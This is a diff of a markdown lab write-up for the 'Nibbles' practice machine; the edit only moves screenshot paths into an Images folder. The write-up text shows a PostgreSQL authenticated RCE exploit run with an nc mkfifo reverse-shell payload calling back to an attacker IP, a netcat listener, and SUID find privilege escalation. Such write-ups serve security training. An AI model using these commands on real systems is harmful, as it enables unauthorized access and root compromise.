@@ -53,36 +53,36 @@ From the Nmap scan results, discovered that PostgreSQL was running on port 5437.
 ```sh
 psql -h 192.168.168.47 -p 5437 -U postgres
 ```
-![](Nibbles1.png)
-![](Nibbles2.png)
+![](Images/Nibbles1.png)
+![](Images/Nibbles2.png)
 The Nmap scan revealed that the PostgreSQL version was between 11.3 and 11.9. After further research, found that versions 9.3 to 11.7 are vulnerable to authenticated remote code execution.
-![](Nibbles3.png)
+![](Images/Nibbles3.png)
 
 Then I used an exploit from ExploitDB (searchsploit) to execute system commands.
-![](Nibbles4.png)
-![](Nibbles5.png)
-![](Nibbles6.png)
+![](Images/Nibbles4.png)
+![](Images/Nibbles5.png)
+![](Images/Nibbles6.png)
 Before exploiting the vulnerability to gain a reverse shell, set up a Netcat listener on our attacking machine with the command `nc -lvp 80` to receive connection. By crafting a payload specifically for PostgreSQL, I was able to get a reverse shell from the target machine.
-![](Nibbles7.png)
+![](Images/Nibbles7.png)
 ```sh
 python3 50847.py -i 192.168.168.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.240 80 >/tmp/f'
 ```
-![](Nibbles8.png)
+![](Images/Nibbles8.png)
 We got the shell.
-![](Nibbles9.png)
-![](Nibbles10.png)
+![](Images/Nibbles9.png)
+![](Images/Nibbles10.png)
 
 ### Privilege Escalation
 Further enumeration revealed that the `find` binary had the SUID permission enabled.
 ```sh
 find / -perm -u=s -type f 2>/dev/null
 ```
-![](Nibbles11.png)
-![](Nibbles12.png)
+![](Images/Nibbles11.png)
+![](Images/Nibbles12.png)
 ```sh
 find . -exec /bin/sh -p \; -quit
 ```
 
-![](Nibbles13.png)
+![](Images/Nibbles13.png)
 
 
